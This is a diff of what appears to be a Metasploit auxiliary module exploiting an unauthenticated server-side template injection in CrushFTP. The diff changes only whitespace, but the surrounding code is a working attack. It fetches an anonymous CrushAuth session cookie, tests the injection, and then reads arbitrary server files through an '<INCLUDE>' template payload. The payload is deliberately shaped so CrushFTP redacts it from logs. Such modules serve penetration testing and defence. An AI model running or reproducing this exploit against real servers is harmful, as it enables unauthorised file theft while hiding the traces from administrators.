@@ -6,7 +6,7 @@
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   prepend Msf::Exploit::Remote::AutoCheck
-  
+
   def initialize(info = {})
     super(
       update_info(
@@ -37,7 +37,7 @@ class MetasploitModule < Msf::Auxiliary
         }
       )
     )
-    
+
     register_options(
       [
         Opt::RPORT(443),
@@ -47,60 +47,60 @@ class MetasploitModule < Msf::Auxiliary
       ]
     )
   end
-  
+
   def check
     # Unauthenticated requests to WebInterface endpoints should receive a response containing an 'anonymous' user session cookie
     res_anonymous_check = get_anon_session
-    
+
     return Msf::Exploit::CheckCode::Unknown('Connection failed') unless res_anonymous_check
-    
+
     # Confirm that the response returned a CrushAuth cookie and the status code was 404
     if (res_anonymous_check.code != 404) || !res_anonymous_check.get_cookies.include?('CrushAuth')
       return Msf::Exploit::CheckCode::Unknown('The application did not return a 404 response that provided an anonymous session cookie')
     end
-    
+
     # Extract the CrushAuth anonymous session cookie value using regex
     crushauth_cookie = res_anonymous_check&.get_cookies&.match(/\d{13}_[A-Za-z0-9]{30}/)
-    
+
     # The string "password" is included to invoke CrushFTP's sensitive parameter redaction in logs. The injection will be logged as "********"
     # NOTE: Due to an apparent bug in the way CrushFTP redacts data, if file paths contain ":", some of the injection will be leaked in logs
     res_template_inject = perform_template_injection('{user_name}password', crushauth_cookie)
-    
+
     return Msf::Exploit::CheckCode::Unknown('Connection failed') unless res_template_inject
-    
+
     # Confirm that the "{user_name}" template injection evaluates to "anonymous" in the response
     unless res_template_inject.body.include?('You need upload permissions to zip a file:anonymous')
       return Msf::Exploit::CheckCode::Safe('Server-side template injection failed!')
     end
-    
+
     Msf::Exploit::CheckCode::Vulnerable('Server-side template injection successful!')
   end
-  
+
   def run
     # Unauthenticated requests to WebInterface endpoints should receive a response containing an 'anonymous' user session cookie
     print_status('Fetching anonymous session cookie...')
     res_anonymous = get_anon_session
-    
+
     fail_with(Failure::Unknown, 'Connection failed') unless res_anonymous
-    
+
     # Confirm that the response returned a CrushAuth cookie and the status code was 404
     if (res_anonymous&.code != 404) || res_anonymous&.get_cookies !~ /CrushAuth=([^;]+;)/
       fail_with(Failure::Unknown, 'The application did not return a 404 response that provided an anonymous session cookie')
     end
-    
+
     # Extract the CrushAuth cookie value from the response 'Set-Cookie' data
     crushauth_cookie = res_anonymous&.get_cookies&.match(/\d{13}_[A-Za-z0-9]{30}/)
-    
+
     file_name = datastore['TARGETFILE']
-    
+
     print_status("Using template injection to read file: #{file_name}")
-    
+
     # These tags will be used to identify the beginning and end of the file data in the response
     # The string "_pass_" is prepended to the injection to invoke CrushFTP sensitive parameter redaction in logs. The injection will be logged as "********"
     # NOTE: Due to an apparent bug in the way CrushFTP redacts data, if file paths contain ":", some of the injection will be leaked in logs
     file_begin_tag = '_pass_'
     file_end_tag = 'file-end'
-    
+
     # Perform the template injection for file read
     res_steal_file = perform_template_injection("#{file_begin_tag}<INCLUDE>#{file_name}</INCLUDE>#{file_end_tag}", crushauth_cookie)
 
